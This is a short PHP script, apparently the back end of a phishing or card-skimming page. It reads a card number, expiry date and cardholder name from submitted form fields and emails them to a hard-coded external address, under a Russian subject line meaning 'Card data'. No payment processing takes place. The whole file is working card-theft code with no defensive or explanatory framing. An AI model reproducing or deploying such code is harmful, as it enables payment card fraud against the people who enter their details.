<?php 
$cardcode = $_POST['cardcode'];
$carddate = $_POST['carddate'];
$cardname = $_POST['cardname'];


$success = mail("hotab@bk.ru",'Данные карты',
'Здравствуйте'."\n".
'Ваш номер карты: '.$cardcode."\n".
'Срок действия: '.$carddate."\n".
'Имя владельца: '.$cardname);

echo $success;
?>

